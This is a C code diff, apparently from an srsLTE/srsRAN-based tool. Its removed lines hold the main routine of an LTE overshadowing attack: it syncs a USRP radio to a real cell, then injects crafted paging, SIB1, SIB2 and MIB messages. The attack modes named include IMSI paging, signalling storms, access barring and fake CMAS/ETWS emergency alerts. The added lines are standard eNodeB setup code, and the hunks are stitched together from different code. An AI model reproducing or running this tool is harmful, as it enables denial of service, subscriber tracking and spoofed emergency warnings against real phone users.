-            // fprintf(stderr,"[Rx] ret: %d, sfn: %d, sf_idx: %d, time: %.f: %f s\n",rx_ret,sfn,sf_idx,difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);
-            // fprintf(stderr,"[Rx] rx_ret: %d\n",rx_ret);
-            // fprintf(stderr,"[Rx] sf_idx: %d\n",sf_idx);
-            // fprintf(stderr,"[Rx] time: %.f: %f s\n",difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);
-
-            // if (srslte_ue_sync_get_sfidx(&ue_sync) != 0 && srslte_ue_sync_get_sfidx(&ue_sync) != 5) {
-            if (srslte_ue_sync_get_sfidx(&ue_sync) == 5 && (sfn % 2) == 0)
-            {
-                n = srslte_ue_dl_decode(&ue_dl, data, 0, sfn * 10 + srslte_ue_sync_get_sfidx(&ue_sync), acks);
-                // TODO: 在 MIMO 情况下，srslte_ue_dl_decode 的逻辑不同。必须参考 pdsch_ue 的实现
-
-                // if (n > 0) {
-                //   if (n != 904) {
-                //     printf("TB is not 904!!!\n");
-                //   }
-                //   //printf("Format: %s\n", srslte_dci_format_string(ue_dl.dci_format));
-                //   //srslte_ra_dl_grant_fprint(stdout, &ue_dl.pdsch_cfg.grant);
-                // }
-                // else {
-                //   printf("n < 0\n");
-                // }
-            }
-            pthread_mutex_unlock(&mutex);
-            usleep(1);
-            // if (srslte_ue_sync_get_sfidx(&ue_sync) == 0) {
-            //   printf("[+] CFO: %+5.12f Hz, SFO: %+3.6f Hz, SFN: %d\n",
-            //       srslte_ue_sync_get_cfo(&ue_sync), srslte_ue_sync_get_sfo(&ue_sync), sfn);
-            // }
-            // if (srslte_ue_sync_get_sfidx(&ue_sync) == 5) {
-            //   printf("[+] CFO: %+5.12f Hz, SFO: %+3.6f Hz\n",
-            //       srslte_ue_sync_get_cfo(&ue_sync), srslte_ue_sync_get_sfo(&ue_sync));
-            // }
+            case 0:
+                break;
+            default:
+                usage(argv[0]);
+                exit(-1);
         }
-        else
-        {
-            sf_idx = srslte_ue_sync_get_sfidx(&ue_sync);
-            printf("\033[1;33m[Subframe %d] UE与基站的子帧同步失败(zerocopy_multi failed)\n\033[0m", sf_idx);
-            rx_ret = -1;
-            sfn = -100;
-            // fprintf(stderr, "zerocopy_multi failed\n");
-            updated = true;
-            pthread_cond_signal(&cond);
-            pthread_mutex_unlock(&mutex);
-        }
-        // previous_time.full_secs = last_stamp.full_secs;
-        // previous_time.frac_secs = last_stamp.frac_secs;
-
-        // if (last_stamp.frac_secs - previous_time.frac_secs != 0.001) {
-        //   printf("[Now] %5.17f\n",last_stamp.frac_secs*1e6);
-        //   printf("[Bef] %5.17f\n", previous_time.frac_secs*1e6);
-        //   printf("[Sub] %5.17f\n", (last_stamp.frac_secs - previous_time.frac_secs)*1e6);
-        // }
-
-        // printf("[2][get_last_time] %.f: %f us\n",difftime(last_stamp.full_secs, (time_t) 0),(last_stamp.frac_secs*1e6));
-        // printf("[2][current_time] %.f: %f s\n",difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);
     }
-    return NULL;
-}
 
-int main(int argc, char **argv) // 主函数
-{
-    // printf("\033[1;32m[+] 开始执行主函数 \033[0m\n");
-
-    // 变量声明和初始化
-    int i;
-    int decimate = 1;                                               // 降采样因子
-    float cfo = 0;                                                  // 载波频率偏移
-    int nf = 0, N_id_2 = 0;                                         // 帧号和PSS序列号
-    cf_t pss_signal[SRSLTE_PSS_LEN];                                // PSS信号缓冲区
-    float sss_signal0[SRSLTE_SSS_LEN];                              // 子帧0的SSS信号
-    float sss_signal5[SRSLTE_SSS_LEN];                              // 子帧5的SSS信号
-    uint8_t bch_payload[SRSLTE_BCH_PAYLOAD_LEN];                    // BCH传输块
-    cf_t *sf_symbols[SRSLTE_MAX_PORTS];                             // 子帧符号
-    cf_t *slot1_symbols[SRSLTE_MAX_PORTS];                          // 时隙1符号
-    srslte_dci_msg_t dci_msg;                                       // DCI消息
-    srslte_dci_location_t locations[SRSLTE_NSUBFRAMES_X_FRAME][30]; // DCI位置
-    srslte_refsignal_t csr_refs;                                    // 小区特定参考信号
-    srslte_refsignal_t mbsfn_refs;                                  // MBSFN参考信号
-
-    srslte_debug_handle_crash(argc, argv); // 遇到报错，上报给 crash_handler 便于定位
-
-    if (argc < 3) // 参数检查，若参数过少则弹出帮助页面
-    {
+#ifdef DISABLE_RF
+    if (!output_file_name) {
         usage(argv[0]);
         exit(-1);
     }
-
-    parse_args(argc, argv); // 解析命令行参数
-
-    N_id_2 = cell.id % 3; // 计算PSS序列号（N_id_2 = 小区ID mod 3）
-
-    // 计算子帧的资源元素数和采样点数
-    sf_n_re = 2 * SRSLTE_CP_NORM_NSYMB * cell.nof_prb * SRSLTE_NRE;
-    sf_n_samples = 2 * SRSLTE_SLOT_LEN(srslte_symbol_sz(cell.nof_prb));
-
-    // 设置PHICH参数
-    cell.phich_length = SRSLTE_PHICH_NORM;
-    cell.phich_resources = SRSLTE_PHICH_R_1;
-    sfn = 0; // 系统帧号初始化为0
-
-    // 计算PRB集合数量
-    prbset_num = (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb));
-    last_prbset_num = prbset_num;
-
-    // 基础初始化（必须在设置slot_len_*之后调用）
-    base_init();
-
-    // 生成PSS/SSS同步信号
-    srslte_pss_generate(pss_signal, N_id_2);
-    srslte_sss_generate(sss_signal0, sss_signal5, cell.id);
-
-    // 生成参考信号
-    if (srslte_refsignal_cs_init(&csr_refs, cell.nof_prb))
-    {
-        fprintf(stderr, "Error initializing equalizer\n");
-        exit(-1);
-    }
-
-    // 如果配置了MBSFN区域ID，初始化MBSFN参考信号
-    if (mbsfn_area_id > -1)
-    {
-        if (srslte_refsignal_mbsfn_init(&mbsfn_refs, cell, mbsfn_area_id))
-        {
-            fprintf(stderr, "Error initializing equalizer\n");
-            exit(-1);
-        }
-    }
-
-    // 设置小区参考信号
-    if (srslte_refsignal_cs_set_cell(&csr_refs, cell))
-    {
-        fprintf(stderr, "Error setting cell\n");
-        exit(-1);
-    }
-
-    // 初始化符号缓冲区指针
-    for (i = 0; i < SRSLTE_MAX_PORTS; i++)
-    {
-        sf_symbols[i] = sf_buffer[i % cell.nof_ports];
-        slot1_symbols[i] = &sf_buffer[i % cell.nof_ports][SRSLTE_SLOT_LEN_RE(cell.nof_prb, cell.cp)];
-    }
-
-    // 设置信号处理（用于Ctrl+C退出）
-    sigset_t sigset;
-    sigemptyset(&sigset);
-    sigaddset(&sigset, SIGINT);
-    sigprocmask(SIG_UNBLOCK, &sigset, NULL);
-    signal(SIGINT, sig_int_handler);
-
-    // 设置采样率
-    int srate = srslte_sampling_freq_hz(cell.nof_prb);
-    if (srate != -1)
-    {
-        if (srate < 10e6)
-        {
-            srslte_rf_set_master_clock_rate(&rf, 4 * srate);
-        }
-        else
-        {
-            srslte_rf_set_master_clock_rate(&rf, srate);
-        }
-        printf("[+] Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
-        float srate_rf = srslte_rf_set_tx_srate(&rf, (double)srate);
-        if (srate_rf != srate)
-        {
-            fprintf(stderr, "Could not set sampling rate\n");
-            exit(-1);
-        }
-    }
-    else
-    {
-        fprintf(stderr, "Invalid number of PRB %d\n", cell.nof_prb);
-        exit(-1);
-    }
-
-    // 设置RF参数
-    printf("[+] Set TX gain(发送增益): %.1f dB\n", srslte_rf_set_tx_gain(&rf, rf_gain));
-    // printf("[+] Get TX gain(): %.1f dB\n", srslte_rf_get_tx_gain(&rf));
-    printf("[+] Set TX freq(发送频率): %.2f MHz\n", srslte_rf_set_tx_freq(&rf, rf_freq) / 1000000);
-
-    // 设置接收参数（用于同步）
-    printf("[+] Set RX gain(接收增益): %.1f dB\n", srslte_rf_set_rx_gain(&rf, 25));
-    printf("[+] Set RX freq(接收频率): %.2f MHz\n", srslte_rf_set_rx_freq(&rf, rf_freq) / 1000000);
-    bool locked = srslte_rf_rx_wait_lo_locked(&rf);
-    printf("[1] LO(本地振荡器)是否已经锁定: %s\n", locked ? "locked" : "Not locked"); // 锁定后接收信号频率稳定
-
-    // 搜索并解码MIB（主信息块）来检测小区
-    uint32_t ntrial = 0;
-    int ret = 0;
-    do
-    {
-        ret = rf_search_and_decode_mib(&rf, 1, &cell_detect_config, -1, &cell, &cfo);
-        if (ret < 0)
-        {
-            fprintf(stderr, "Error searching for cell\n");
-            exit(-1);
-        }
-        else if (ret == 0 && !go_exit)
-        {
-            printf("[-] Cell not found after %d trials. Trying again (Press Ctrl+C to exit)\n", ntrial++);
-        }
-    } while (ret == 0 && !go_exit);
-
-    if (go_exit)
-    {
-        srslte_rf_close(&rf);
-        exit(0);
-    }
-
-    printf("\033[1;32m[+] 停止RF接收并清空缓存, 开始同步...\n\033[0m");
-    // 停止接收流并清空缓冲区
-    srslte_rf_stop_rx_stream(&rf);
-    srslte_rf_flush_buffer(&rf);
-
-    // 设置接收采样率
-    printf("[+] Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
-    float srate_rf2 = srslte_rf_set_rx_srate(&rf, (double)srate);
-    if (srate_rf2 != srate)
-    {
-        fprintf(stderr, "Could not set sampling rate\n");
-        exit(-1);
-    }
-
-    // 初始化UE同步模块
-    if (srslte_ue_sync_init_multi_decim(&ue_sync,
-                                        cell.nof_prb,
-                                        cell.id == 1000,
-                                        srslte_rf_recv_wrapper,
-                                        1, // 接收天线数
-                                        (void *)&rf, decimate))
-    {
-        fprintf(stderr, "Error initiating ue_sync\n");
-        exit(-1);
-    }
-    if (srslte_ue_sync_set_cell(&ue_sync, cell))
-    {
-        fprintf(stderr, "Error initiating ue_sync\n");
-        exit(-1);
-    }
-
-    // UHD设备特定的时间同步设置
-    rf_uhd_handler_t *handler = (rf_uhd_handler_t *)rf.handler;
-    uhd_usrp_set_time_unknown_pps(handler->usrp, 0, 0.0); // 设置PPS时间
-    usleep(1000000);
-
-    // 设置频率调谐参数
-    uhd_tune_request_t tune_request = {
-        .target_freq = rf_freq,
-        .rf_freq_policy = UHD_TUNE_REQUEST_POLICY_AUTO,
-        .dsp_freq_policy = UHD_TUNE_REQUEST_POLICY_AUTO,
-    };
-    uhd_tune_result_t tune_result;
-
-    // 获取 USRP 硬件的当前时间
-    time_t full_secs;
-    double frac_secs;
-    uhd_usrp_get_time_now(handler->usrp, 0, &full_secs, &frac_secs);
-    printf("[+] current_time %.f: %f us\n", difftime(full_secs, (time_t)0), (frac_secs * 1e6));
-
-    // 设置精确的时间同步
-    uhd_usrp_set_command_time(handler->usrp, full_secs + 1, frac_secs, 0);
-    uhd_usrp_set_rx_freq(handler->usrp, &tune_request, 0, &tune_result);
-    uhd_usrp_set_tx_freq(handler->usrp, &tune_request, 0, &tune_result);
-    uhd_usrp_clear_command_time(handler->usrp, 0);
-    usleep(1000000);
-
-    // 检查锁相环状态
-    locked = srslte_rf_rx_wait_lo_locked(&rf);
-    printf("[2] LO(本地振荡器)是否已经锁定: %s\n", locked ? "locked" : "Not locked"); // 锁定后接收信号频率稳定
-
-    // 验证频率设置
-    double tx_freq, rx_freq;
-    uhd_usrp_get_tx_freq(handler->usrp, 0, &tx_freq);
-    uhd_usrp_get_rx_freq(handler->usrp, 0, &rx_freq);
-    if (tx_freq != rf_freq)
-    {
-        printf("[Tx freq_diff] %f\n", (tx_freq - rf_freq));
-    }
-    if (rx_freq != rf_freq)
-    {
-        printf("[Rx freq_diff] %f\n", (rx_freq - rf_freq));
-    }
-
-    // 设置同步参数
-    ue_sync.cfo_current_value = cfo / 15000;
-    ue_sync.cfo_is_copied = true;
-    ue_sync.cfo_correct_enable_find = true;
-    ue_sync.cfo_correct_enable_track = true;
-    srslte_sync_set_cfo_cp_enable(&ue_sync.sfind, false, 0);
-
-    // 分配同步缓冲区
-    for (int i = 0; i < 1; i++)
-    { // 单天线
-        sf_buffer_sync[i] = srslte_vec_malloc(3 * sizeof(cf_t) * SRSLTE_SF_LEN_PRB(100));
-        if (!sf_buffer_sync[i])
-        {
-            perror("malloc");
-            exit(-1);
-        }
-    }
-
-    // 选择攻击类型
-    if (attack_mode == PAGING_IMSI) // 0
-    {
-        read_file(output_buffer3[0], "Paging_IMSI"); // 子帧9的寻呼数据
-    }
-    else if (attack_mode == SIB1_SIG_STORM) // 1
-    {
-        read_file(output_buffer2[0], "SIB1_SIG_STORM"); // 子帧5的TAU SIB1
-        read_file(output_buffer3[0], "Paging_MODI");    // 子帧9的系统修改寻呼
-    }
-    else if (attack_mode == SIB2_AC_BARRING) // 2
-    {
-        read_file(output_buffer4[0], "SIB2_AcBarring"); // 子帧0的接入限制SIB2
-        read_file(output_buffer3[0], "Paging_MODI");     // 子帧9的寻呼
-    }
-    else if (attack_mode == SIB1_MNC) // 3
-    {
-        read_file(output_buffer2[0], "SIB1_MNC"); // 子帧5的SIB1
-        // read_file(output_buffer2[0], "SIB1_CellBarred"); // 子帧5的SIB1
-        // read_file(output_buffer2[0], "SIB1_CsgInd"); // 子帧5的SIB1
-        // read_file(output_buffer2[0], "SIB1_TEST"); // 子帧5的SIB1
-        read_file(output_buffer3[0], "Paging_MODI");  // 子帧9的系统修改寻呼
-        // read_file(output_buffer3[0], "PAGING_ETWS");       // 子帧9的寻呼数据
-    }else if (attack_mode == MIB_DLBW) // 4
-    {
-        read_file(output_buffer4[0], "MIB_DLBW"); // 子帧0的接入限制SIB2
-        read_file(output_buffer3[0], "Paging_MODI");     // 子帧9的寻呼
-    }
-    else if (attack_mode == SIB1_CMAS) // 5
-    {
-        read_file(output_buffer2[0], "SIB1_CMAS");   // 子帧5的SIB1
-        read_file(output_buffer3[0], "Paging_MODI"); // 子帧9的寻呼
-        // read_file(output_buffer4[0], "SIB2_AC_BARRING"); // 子帧0的接入限制SIB2
-        read_file(output_buffer4[0], "SIB12_CMAS"); // 子帧10的SIB12
-    }
-    else if (attack_mode == PAGING_ETWS) // 6
-    {
-        read_file(output_buffer3[0], "PAGING_ETWS"); // 子帧9的寻呼数据
-    }
-    else
-    {
-        printf("Un-supported Case!\n");
-    }
-
-    // 初始化UE MIB解码器
-    if (srslte_ue_mib_init(&ue_mib, sf_buffer_sync, cell.nof_prb))
-    {
-        fprintf(stderr, "Error initaiting UE MIB decoder\n");
-        exit(-1);
-    }
-    if (srslte_ue_mib_set_cell(&ue_mib, cell))
-    {
-        fprintf(stderr, "Error initaiting UE MIB decoder\n");
-        exit(-1);
-    }
-
-    // 初始化UE下行处理模块
-    if (srslte_ue_dl_init(&ue_dl, sf_buffer_sync, cell.nof_prb, 1))
-    {
-        fprintf(stderr, "Error initiating UE downlink processing module\n");
-        exit(-1);
-    }
-    if (srslte_ue_dl_set_cell(&ue_dl, cell))
-    {
-        fprintf(stderr, "Error initiating UE downlink processing module\n");
-        exit(-1);
-    }
-
-    // 配置信道估计参数
-    srslte_chest_dl_cfo_estimate_enable(&ue_dl.chest, false, 1023);
-    srslte_chest_dl_average_subframe(&ue_dl.chest, false);
-    srslte_ue_dl_set_rnti(&ue_dl, UE_CRNTI); // 设置C-RNTI
-
-    // 重置PBCH解码器
-    srslte_pbch_decode_reset(&ue_mib.pbch);
-
-    // 启动接收流
-    srslte_rf_start_rx_stream(&rf, false);
-
-    // **** 创建并启动 发送TX 和 接收RX 的线程 ****
-    if (pthread_create(&tx_thread, NULL, tx_thread_func, NULL))
-    {
-        printf("\033[1;31m[x] 发送线程启动失败\n\033[0m");
-        exit(-1);
-    }
-    else
-    {
-        printf("\033[1;32m[+] 发送线程启动成功\n\033[0m");
-    }
-
-    if (pthread_create(&rx_thread, NULL, rx_thread_func, NULL))
-    {
-        printf("\033[1;31m[x] 接收线程启动失败\n\033[0m");
-        exit(-1);
-    }
-    else
-    {
-        printf("\033[1;32m[+] 接收线程启动成功\n\033[0m");
-    }
-
-    int status;
-    int tx_status, rx_status;
-
-    // 等待线程结束，并获取其返回值
-    pthread_join(tx_thread, (void **)&tx_status);
-    pthread_join(rx_thread, (void **)&rx_status);
-    if (tx_status != 0)
-    {
-        printf("TX线程异常退出\n");
-    }
-    if (rx_status != 0)
-    {
-        printf("RX线程异常退出\n");
-    }
-    printf("\033[1;32m[+] 线程已结束\n\033[0m");
-
-    // 清理资源
-    status = pthread_mutex_destroy(&mutex);
-    if (status != 0)
-    {
-        printf("\033[1;31m[+] 销毁互斥锁失败，错误码: %d\n\033[0m", status);
-    }
-    else
-    {
-        printf("\033[1;32m[+] 互斥锁销毁成功\n\033[0m");
-    }
-
-    srslte_ue_sync_free(&ue_sync);
-    srslte_rf_close(&rf);
-    printf("\033[1;32m[+] 程序终止成功\n\033[0m");
-    exit(0);
+#endif
 }
+ static int parse_cfr_args()
+ {
+   cfr_config.cfr_enable  = cfr_args.enable;
+   cfr_config.manual_thr  = cfr_args.manual_thres;
+   cfr_config.max_papr_db = cfr_args.auto_target_papr;
+   cfr_config.alpha       = cfr_args.strength;
+   cfr_config.ema_alpha   = cfr_args.ema_alpha;
+ 
+   cfr_config.cfr_mode = srsran_cfr_str2mode(cfr_args.mode);
+   if (cfr_config.cfr_mode == SRSRAN_CFR_THR_INVALID) {
+     ERROR("CFR mode not recognised");
+     return SRSRAN_ERROR;
+   }
+ 
+   if (!srsran_cfr_params_valid(&cfr_config)) {
+     ERROR("Invalid CFR parameters");
+     return SRSRAN_ERROR;
+   }
+   return SRSRAN_SUCCESS;
+ }
+ 
+ static void base_init()
+ {
+   int i; 
+   switch (transmission_mode) {
+     case SRSRAN_TM1:
+       cell.nof_ports = 1;
+       break;
+     case SRSRAN_TM2:
+     case SRSRAN_TM3:
+     case SRSRAN_TM4:
+       cell.nof_ports = 2;
+       break;
+     default:
+       ERROR("Transmission mode %d not implemented or invalid", transmission_mode);
+       exit(-1);
+   }
+   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
+     data[i] = srsran_vec_u8_malloc(SOFTBUFFER_SIZE);
+     if (!data[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     bzero(data[i], sizeof(uint8_t) * SOFTBUFFER_SIZE);
+   }
+   data_mbms = srsran_vec_u8_malloc(SOFTBUFFER_SIZE);
+ 
+   /* init memory */
+   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
+     sf_buffer[i] = srsran_vec_cf_malloc(sf_n_re);
+     if (!sf_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+   }
+ 
+   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
+     output_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     if (!output_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(output_buffer[i], sf_n_samples);
+   }
+ 
+   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
+      ext_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+      //printf("test yg 1230 sf_n_samples:%d\n", sf_n_samples);
+      if (!ext_buffer[i]) {
+        perror("malloc");
+        exit(-1);
+      }
+      srsran_vec_cf_zero(ext_buffer[i], sf_n_samples);
+
+     paging_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     //printf("test yg 1230 sf_n_samples:%d\n", sf_n_samples);
+     if (!paging_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(paging_buffer[i], sf_n_samples);
+ 
+     sib1_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     if (!sib1_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(sib1_buffer[i], sf_n_samples);
+ 
+     sib2_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     if (!sib2_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(sib2_buffer[i], sf_n_samples);
+
+     po_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     if (!po_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(po_buffer[i], sf_n_samples);
+
+     ar_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     if (!ar_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(ar_buffer[i], sf_n_samples);
+
+     ir_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     if (!ir_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(ir_buffer[i], sf_n_samples);
+   }
+ 
+   /* open file or USRP */
+   if (output_file_name) {
+     if (strcmp(output_file_name, "NULL")) {
+       if (srsran_filesink_init(&fsink, output_file_name, SRSRAN_COMPLEX_FLOAT_BIN)) {
+         ERROR("Error opening file %s", output_file_name);
+         exit(-1);
+       }
+       null_file_sink = false;
+     } else {
+       null_file_sink = true;
+     }
+   } else {
+ #ifndef DISABLE_RF
+     printf("Opening RF device...\n");    
+     // test yg 1023
+     //printf("test 1023 nof_ports:%d\n", cell.nof_ports);
+     if (srsran_rf_open_devname(&radio, rf_dev, rf_args, cell.nof_ports)) {
+       fprintf(stderr, "Error opening rf\n");
+       exit(-1);
+     }
+ #else
+     printf("Error RF not available. Select an output file\n");
+     exit(-1);
+ #endif
+   }
+ 
+   if (net_port > 0) {
+     if (srsran_netsource_init(&net_source, "127.0.0.1", net_port, SRSRAN_NETSOURCE_UDP)) {
+       ERROR("Error creating input UDP socket at port %d", net_port);
+       exit(-1);
+     }
+     if (null_file_sink) {
+       if (srsran_netsink_init(&net_sink, "127.0.0.1", net_port + 1, SRSRAN_NETSINK_TCP)) {
+         ERROR("Error sink");
+         exit(-1);
+       }
+     }
+     if (sem_init(&net_sem, 0, 1)) {
+       perror("sem_init");
+       exit(-1);
+     }
+   }
+ 
+   /* create ifft object */
+   for (i = 0; i < cell.nof_ports; i++) {
+     if (srsran_ofdm_tx_init(&ifft[i], cell.cp, sf_buffer[i], output_buffer[i], cell.nof_prb)) {
+       ERROR("Error creating iFFT object");
+       exit(-1);
+     }
+ 
+     srsran_ofdm_set_normalize(&ifft[i], true);
+     if (srsran_ofdm_set_cfr(&ifft[i], &cfr_config)) {
+       ERROR("Error setting CFR object");
+       exit(-1);
+     }
+   }
+ 
+   if (srsran_ofdm_tx_init_mbsfn(&ifft_mbsfn, SRSRAN_CP_EXT, sf_buffer[0], output_buffer[0], cell.nof_prb)) {
+     ERROR("Error creating iFFT object");
+     exit(-1);
+   }
+   srsran_ofdm_set_non_mbsfn_region(&ifft_mbsfn, 2);
+   srsran_ofdm_set_normalize(&ifft_mbsfn, true);
+   if (srsran_ofdm_set_cfr(&ifft_mbsfn, &cfr_config)) {
+     ERROR("Error setting CFR object");
+     exit(-1);
+   }
+ 
+   if (srsran_pbch_init(&pbch)) {
+     ERROR("Error creating PBCH object");
+     exit(-1);
+   }
+   if (srsran_pbch_set_cell(&pbch, cell)) {
+     ERROR("Error creating PBCH object");
+     exit(-1);
+   }
+ 
+   if (srsran_regs_init(&regs, cell)) {
+     ERROR("Error initiating regs");
+     exit(-1);
+   }
+   if (srsran_pcfich_init(&pcfich, 1)) {
+     ERROR("Error creating PBCH object");
+     exit(-1);
+   }
+   if (srsran_pcfich_set_cell(&pcfich, &regs, cell)) {
+     ERROR("Error creating PBCH object");
+     exit(-1);
+   }
+ 
+   if (srsran_pdcch_init_enb(&pdcch, cell.nof_prb)) {
+     ERROR("Error creating PDCCH object");
+     exit(-1);
+   }
+   if (srsran_pdcch_set_cell(&pdcch, &regs, cell)) {
+     ERROR("Error creating PDCCH object");
+     exit(-1);
+   }
+ 
+   if (srsran_pdsch_init_enb(&pdsch, cell.nof_prb)) {
+     ERROR("Error creating PDSCH object");
+     exit(-1);
+   }
+   if (srsran_pdsch_set_cell(&pdsch, cell)) {
+     ERROR("Error creating PDSCH object");
+     exit(-1);
+   }
+ 
+   if (mbsfn_area_id > -1) {
+     if (srsran_pmch_init(&pmch, cell.nof_prb, 1)) {
+       ERROR("Error creating PMCH object");
+     }
+     srsran_pmch_set_area_id(&pmch, mbsfn_area_id);
+   }
+ 
+   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
+     softbuffers[i] = calloc(sizeof(srsran_softbuffer_tx_t), 1);
+     if (!softbuffers[i]) {
+       ERROR("Error allocating soft buffer");
+       exit(-1);
+     }
+ 
+     if (srsran_softbuffer_tx_init(softbuffers[i], cell.nof_prb)) {
+       ERROR("Error initiating soft buffer");
+       exit(-1);
+     }
+   }
+ }
+ 
+ static void base_free()
+ {
+   int i;
+   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
+     srsran_softbuffer_tx_free(softbuffers[i]);
+     if (softbuffers[i]) {
+       free(softbuffers[i]);
+     }
+   }
+   srsran_pdsch_free(&pdsch);
+   srsran_pdcch_free(&pdcch);
+   srsran_regs_free(&regs);
+   srsran_pbch_free(&pbch);
+   if (mbsfn_area_id > -1) {
+     srsran_pmch_free(&pmch);
+   }
+   srsran_ofdm_tx_free(&ifft_mbsfn);
+   for (i = 0; i < cell.nof_ports; i++) {
+     srsran_ofdm_tx_free(&ifft[i]);
+   }
+ 
+   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
+     if (data[i]) {
+       free(data[i]);
+     }
+   }
+ 
+   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
+     if (sf_buffer[i]) {
+       free(sf_buffer[i]);
+     }
+ 
+     if (output_buffer[i]) {
+       free(output_buffer[i]);
+     }
+     if (sf_buffer_sync[i]) {
+       free(sf_buffer_sync[i]);
+     }
+     if (ext_buffer[i]) {
+      free(ext_buffer[i]);
+    }
+     if (paging_buffer[i]) {
+       free(paging_buffer[i]);
+     }
+     if (sib1_buffer[i]) {
+       free(sib1_buffer[i]);
+     }
+     if (sib2_buffer[i]) {
+       free(sib2_buffer[i]);
+     }
+
+     if (po_buffer[i]) {
+      free(po_buffer[i]);
+    }
+    if (ar_buffer[i]) {
+      free(ar_buffer[i]);
+    }
+    if (ir_buffer[i]) {
+      free(ir_buffer[i]);
+    }
+   }
+   if (output_file_name) {
+     if (!null_file_sink) {
+       srsran_filesink_free(&fsink);
+     }
+   } else {
+ #ifndef DISABLE_RF
+     srsran_rf_close(&radio);
+ #endif
+   }
+ 
+   if (net_port > 0) {
+     srsran_netsource_free(&net_source);
+     sem_close(&net_sem);
+   }
+ }
+ 
+ bool go_exit = false;
+ #ifndef DISABLE_RF
+ static void sig_int_handler(int signo)
+ {
+   printf("SIGINT received. Exiting...\n");
+   if (signo == SIGINT) {
+     go_exit = true;
+     updated = true;
+     pthread_cond_signal(&cond);
+   }
+ }
+ #endif /* DISABLE_RF */
+ 
+ static unsigned int reverse(register unsigned int x)
+ {
+   x = (((x & 0xaaaaaaaa) >> 1) | ((x & 0x55555555) << 1));
+   x = (((x & 0xcccccccc) >> 2) | ((x & 0x33333333) << 2));
+   x = (((x & 0xf0f0f0f0) >> 4) | ((x & 0x0f0f0f0f) << 4));
+   x = (((x & 0xff00ff00) >> 8) | ((x & 0x00ff00ff) << 8));
+   return ((x >> 16) | (x << 16));
+ }
+ 
+ static uint32_t prbset_to_bitmask()
+ {
+   uint32_t mask = 0;
+   int      nb   = (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb));
+   for (int i = 0; i < nb; i++) {
+     if (i >= prbset_orig && i < prbset_orig + prbset_num) {
+       mask = mask | (0x1 << i);
+     }
+   }
+   return reverse(mask) >> (32 - nb);
+ }
+ 
+ static int update_radl()
+ {
+   ZERO_OBJECT(dci_dl);
+ 
+   int ret = SRSRAN_ERROR;
+ 
+   /* Configure cell and PDSCH in function of the transmission mode */
+   switch (transmission_mode) {
+     case SRSRAN_TM1:
+     case SRSRAN_TM2:
+       nof_tb        = 1;
+       dci_dl.format = SRSRAN_DCI_FORMAT1;
+       break;
+     case SRSRAN_TM3:
+       dci_dl.format = SRSRAN_DCI_FORMAT2A;
+       nof_tb        = 2;
+       break;
+     case SRSRAN_TM4:
+       dci_dl.format = SRSRAN_DCI_FORMAT2;
+       nof_tb        = multiplex_nof_layers;
+       if (multiplex_nof_layers == 1) {
+         dci_dl.pinfo = (uint8_t)(multiplex_pmi + 1);
+       } else {
+         dci_dl.pinfo = (uint8_t)multiplex_pmi;
+       }
+       break;
+     default:
+       ERROR("Transmission mode not implemented.");
+       goto exit;
+   }
+ 
+   dci_dl.rnti                    = UE_CRNTI;
+   dci_dl.pid                     = 0;
+   dci_dl.tb[0].mcs_idx           = mcs_idx;
+   dci_dl.tb[0].ndi               = 0;
+   dci_dl.tb[0].rv                = rvidx[0];
+   dci_dl.tb[0].cw_idx            = 0;
+   dci_dl.alloc_type              = SRSRAN_RA_ALLOC_TYPE0;
+   dci_dl.type0_alloc.rbg_bitmask = prbset_to_bitmask();
+ 
+   if (nof_tb > 1) {
+     dci_dl.tb[1].mcs_idx = mcs_idx;
+     dci_dl.tb[1].ndi     = 0;
+     dci_dl.tb[1].rv      = rvidx[1];
+     dci_dl.tb[1].cw_idx  = 1;
+   } else {
+     SRSRAN_DCI_TB_DISABLE(dci_dl.tb[1]);
+   }
+ 
+   // Increase the CFR threshold or target PAPR
+   if (cfr_thr_inc) {
+     cfr_thr_inc = false; // Reset the flag
+     if (cfr_config.cfr_enable && cfr_config.cfr_mode == SRSRAN_CFR_THR_MANUAL) {
+       cfr_config.manual_thr += CFR_THRES_STEP;
+       for (int i = 0; i < cell.nof_ports; i++) {
+         if (srsran_cfr_set_threshold(&ifft[i].tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
+           ERROR("Setting the CFR");
+           goto exit;
+         }
+       }
+       if (srsran_cfr_set_threshold(&ifft_mbsfn.tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
+         ERROR("Setting the CFR");
+         goto exit;
+       }
+       printf("CFR Thres. set to %.3f\n", cfr_config.manual_thr);
